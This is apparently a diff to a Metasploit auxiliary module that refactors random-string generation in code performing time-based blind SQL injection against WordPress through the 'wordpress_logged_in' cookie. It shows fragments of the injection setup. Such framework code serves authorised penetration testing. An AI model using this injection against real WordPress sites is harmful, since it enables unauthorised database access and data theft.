@@ -48,9 +48,9 @@ class MetasploitModule < Msf::Auxiliary
   def run_host(ip)
     print_status("Performing SQL injection via the 'wordpress_logged_in' cookie...")
 
-    random_number = Rex::Text.rand_text_numeric(rand(4..8))
-    random_table = Rex::Text.rand_text_alpha(rand(4..8))
-    random_string = Rex::Text.rand_text_alpha(rand(4..8))
+    random_number = Rex::Text.rand_text_numeric(4..8)
+    random_table = Rex::Text.rand_text_alpha(4..8)
+    random_string = Rex::Text.rand_text_alpha(4..8)
 
     @sqli = create_sqli(dbms: MySQLi::TimeBasedBlind, opts: { hex_encode_strings: true }) do |payload|
       res = send_request_cgi({
